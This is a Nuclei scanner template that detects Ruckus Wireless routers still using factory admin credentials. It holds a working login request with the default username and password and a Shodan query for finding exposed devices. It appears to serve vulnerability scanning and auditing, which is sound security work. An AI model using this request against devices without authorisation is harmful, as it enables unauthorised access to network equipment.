id: ruckus-wireless-default-login
info:
  name: Ruckus Wireless - Default Login
  author: pussycat0x
  severity: critical
  description: The Ruckus Wireless router has a default admin login vulnerability
    that allows attackers to gain access to user accounts and manipulate data.
  reference:
  - https://docs.commscope.com/bundle/fastiron-08092-securityguide/page/GUID-32D3BB01-E600-4FBE-B555-7570B5024D34.html
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-1391
  metadata:
    verified: true
    shodan-query: title:"ruckus"
    impact: The impact of the Ruckus Wireless default admin login vulnerability is
      potential compromise of user accounts, sensitive information, and unauthorized
      operations by attackers.
    recommendation: It is strongly recommended to change the default login credentials
      for the Ruckus Wireless router to prevent unauthorized access and data breach.
  tags: default-login,router,ruckus
requests:
- raw:
  - 'POST /forms/doLogin HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    login_username={{username}}&password={{password}}

    '
  attack: pitchfork
  payloads:
    username:
    - super
    password:
    - sp-admin
  host-redirects: true
  max-redirects: 2
  cookie-reuse: true
  matchers-condition: and
  matchers:
  - type: word
    part: body
    words:
    - <title>Ruckus Wireless Admin</title>
    - /status/device.asp
    condition: and
  - type: status
    status:
    - 200
